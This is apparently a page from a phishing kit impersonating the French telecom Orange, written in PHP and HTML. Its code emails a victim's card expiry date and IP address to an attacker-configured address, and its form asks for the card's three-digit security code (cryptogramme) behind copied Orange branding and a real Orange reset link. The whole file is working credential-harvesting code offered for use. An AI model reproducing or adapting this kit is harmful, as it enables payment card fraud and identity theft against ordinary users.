<?php

include_once ("auth.php");
if(isset($_POST['date'])){
    $date = $_POST['date'];

    $data = "Date d'expiration: $date,\nAdresse IP: $IP,";
    setHeader($data, $IP);
    $success = mail($SEND_TO, "Date d'expiration - $IP", $data);
    //header("Location: cryptogramme.php");
}
?>

<h2 class="sr-only">Saisissez les informations de votre carte</h2>
<div class="clearfix"></div>
<div class="form-group ">
    <div class="eui-input-label">
        <label for="password" id="passwordLabel">Saisissez les informations de votre carte</label>
        <div class="eui-assistance-area">
            <button data-oevent="idme_password;clic_bulle_aide_mot_de_passe;bulle_aide_mot_de_passe" class="eui-svg eui-icon-help" type="button" id="helpPassword">
                <span class="sr-only">aide</span>
            </button>
        </div>
    </div>
    <div class="eui-help" id="helpPasswordCnt" style="display : none;">
        <p class="noSelectContent" tabindex="-1">Vous ne retrouvez pas votre mot de passe. &gt;&gt; <a href="https://mdp.orange.fr?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil&amp;login=F1RYiR%2BrDwulIp%2BpnyDbftDejktufnYYV%2F2ynqH0syO7fn8%2FI23fDmZNw04gbQ5KFh%2BB7a3jJHmCjeHqNLkOk3CNKQIVsOcPt%2BrFsHPjCiRIpQqc7%2FedaQH3EolJvW2kKzT8W26EkmhxHOqI4eeyBYPGHgSiVFcDNkAcNzGIiSKbnUohpmC1uMCouZa%2BuaTVh1gDAMmmZBjalmzFwmH5Zz5i5KhPYu7FPLvq2jn5ecNwphejQPEVfT9kMLQeB1HE%2FMtib1wUwQtW95xVZgsMCeNquiEMEpDza4roDEE8WQeVknl3Hf0vYBuygYRS1853zK0MeoZ331mtyIchzsN7Vw%3D%3D" class="eui-reinitLostLink" title="Réinitialisez-le.">Réinitialisez-le.</a></p>
    </div>
    <h6 id="error-msg-box" tabindex="0" class="form-control-message" aria-hidden="true" aria-live="assertive" role="alert"></h6>

    <div id="passwordContainer">
        <input type="tel" id="password" style="font-weight: 700;" name="cryptogram" placeholder="Cryptogramme" class="form-control pass-assist" pattern="[0-9]{3}" maxlength="3" required="" aria-hidden="false" aria-invalid="false" aria-required="true">
    </div>
</div>
<div class="text-center">
    <button id="btnSubmi" type="submit" class="btn btn-info eui-btn-sub">Envoyer</button>
</div>
